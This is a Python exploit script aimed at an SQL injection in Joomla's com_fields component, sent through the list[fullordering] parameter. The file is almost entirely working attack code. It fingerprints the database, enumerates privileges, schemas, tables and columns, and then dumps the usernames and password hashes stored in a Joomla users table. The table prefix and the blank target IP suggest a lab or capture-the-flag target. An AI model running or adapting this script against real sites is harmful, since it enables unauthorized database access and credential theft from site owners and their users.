import requests
import html

ip = ""
endpoint = f"http://{ip}/index.php"
query = "option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml"
url = f"{endpoint}?{query}"

print(f"[+] URL:\n\t{url}")


def sqli(payload):
    response = requests.get(url + payload)
    x = response.content.decode()
    # print(x)
    return x


def parse_sqli_response(response):
    x = response
    start = x.index("<blockquote>") + len("<blockquote>")
    end = x.index("</blockquote>")

    x = html.unescape(x[start:end]).strip()
    start2 = x.index("':") + len("':")
    end2 = x.index("'", start2 + 1)

    return x[start2:-1]


def get_user():
    payload = "(null,concat(0x3a,(SELECT CURRENT_USER())),null)"
    return parse_sqli_response(sqli(payload))


def get_database():
    payload = "(null,concat(0x3a,(SELECT DATABASE())),null)"
    return parse_sqli_response(sqli(payload))


def get_dbms():
    payload = "(null,concat(0x3a,(SELECT VERSION())),null)"
    return parse_sqli_response(sqli(payload))


def get_privileges():
    payload = "(null,concat(0x3a,(SELECT COUNT(*) FROM information_schema.user_privileges)),null)"
    count = int(parse_sqli_response(sqli(payload)))
    privs = []

    for x in range(0, count):
        d = {}
        for y in ["GRANTEE", "PRIVILEGE_TYPE", "IS_GRANTABLE"]:
            pass

            payload = f"(null,concat(0x3a,(SELECT {y} FROM information_schema.user_privileges LIMIT {x},1)),null)"
            output = parse_sqli_response(sqli(payload))
            d[y] = output

        privs.append(d)

    return count, privs


def print_privileges():
    privs = get_privileges()
    print(f"[+] Number of privileges: {privs[0]}")
    print("[+] Privileges:\n")
    for d in privs[1]:
        grantee = d['GRANTEE']
        priv_type = d['PRIVILEGE_TYPE']
        is_grantable = d['IS_GRANTABLE']

        str_fmt = "| {:<30} | {:<25} | {:<3} |"
        x = str_fmt.format(grantee, priv_type, is_grantable)
        # print(f"\t| {grantee} | {priv_type} | {is_grantable} |")
        print(x)


def get_database_list():
    payload = "(null,concat(0x3a,(SELECT COUNT(*) FROM information_schema.schemata)),null)"
    count = int(parse_sqli_response(sqli(payload)))
    databases = []

    for x in range(0, count):
        payload = f"(null,concat(0x3a,(SELECT SCHEMA_NAME FROM information_schema.schemata LIMIT {x},1)),null)"
        db = parse_sqli_response(sqli(payload))
        databases.append(db)

    return count, databases


def print_database_list():
    db_list_count, db_list = get_database_list()
    print(f"[+] Number of databases: {db_list_count}")
    print("[+] Databases:")

    for x in db_list:
        print(f"\t- {x}")


def get_table_list(db):
    db_hex = "0x" + db.encode().hex()
    payload = f"(null,concat(0x3a,(SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_SCHEMA = (SELECT {db_hex}))),null)"
    count = int(parse_sqli_response(sqli(payload)))
    table_list = []

    for x in range(0, count):
        payload = f"(null,concat(0x3a,(SELECT HEX(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA = (SELECT {db_hex}) LIMIT {x},1)),null)"
        table = parse_sqli_response(sqli(payload))
        table_list.append(table)

    return count, table_list


def print_table_list(db):
    count, table_list = get_table_list(db)
    print(f"[+] Number of tables for the database '{db}': {count}")
    for x in table_list:
        print(f"\t- {x}")


def get_column_list(db, table):
    db_hex = "0x" + db.encode().hex()
    table_hex = "0x" + table.encode().hex()
    # column_hex = "0x" + "password".encode().hex()

    payload = f"(null,concat(0x3a,(SELECT COUNT(*) FROM information_schema.columns WHERE TABLE_SCHEMA = (SELECT {db_hex}) AND TABLE_NAME LIKE (SELECT {table_hex}))),null)"

    count = int(parse_sqli_response(sqli(payload)))
    column_list = []

    for x in range(0, count):
        payload = f"(null,concat(0x3a,(SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA = (SELECT {db_hex}) AND TABLE_NAME LIKE (SELECT {table_hex}) LIMIT {x},1)),null)"
        column_name = parse_sqli_response(sqli(payload))
        column_list.append(column_name)

    return count, column_list


def get_rows(db, table, column):
    db_hex = "0x" + db.encode().hex()
    table_hex = "0x" + table.encode().hex()
    column_hex = "0x" + column.encode().hex()
    rows = []

    payload = f"(null,concat(0x3a,(SELECT COUNT(*) FROM {db}.{table})),null)"
    count = int(parse_sqli_response(sqli(payload)))

    for x in range(0, count):
        data_array = ""
        payload = f"(null,concat(0x3a,(SELECT CHAR_LENGTH({column}) FROM {db}.{table} LIMIT {x},1)),null)"
        length = int(parse_sqli_response(sqli(payload)))

        for y in range(1, length, 25):
            chars_to_read = 25
            if (length - y) < 25:
                chars_to_read = length - 25

            payload = f"(null,concat(0x3a,(SELECT SUBSTRING((SELECT {column} FROM {db}.{table} LIMIT {x},1), {y}, {chars_to_read}))),null)"
            substring_output = parse_sqli_response(sqli(payload))
            data_array += substring_output

        rows.append(data_array)

    return count, rows


def get_usernames(db, table, column):
    rows = []
    payload = f"(null,concat(0x3a,(SELECT COUNT(*) FROM {db}.{table})),null)"
    count = int(parse_sqli_response(sqli(payload)))

    for x in range(0, count):
        payload = f"(null,concat(0x3a,(SELECT {column} FROM {db}.{table} LIMIT {x},1)),null)"
        username = parse_sqli_response(sqli(payload))

        rows.append(username)

    return count, rows


def main():
    dbms = get_dbms()
    user = get_user()
    db = get_database()

    print(f"[+] Current DBMS: {dbms}")
    print(f"[+] Current User: {user}")
    print(f"[+] Current Database: {db}")
    
    # print_privileges()
    # print_database_list()

    # db_list_count, db_list = get_database_list()

    # for x in db_list:
    #     if x not in ["information_schema", "performance_schema"]:
    #         print_table_list(x)

    db = 'joomla'
    table = 'fb9j5_users'
    count, column_list = get_column_list(db, table)
    print(f"[+] Number of columns in table '{table}': {count}")
    for x in column_list:
        print(f"\t- {x}")

    count, usernames = get_usernames("joomla", "`fb9j5_users`", "username")
    print("[+] Users:")
    for x in usernames:
        print(f"\t- {x}")

    count, passwords = get_rows("joomla", "`fb9j5_users`", "password")
    print("[+] Passwords:")
    for x in passwords:
        print(f"\t- {x}")


if __name__ == '__main__':
    main()
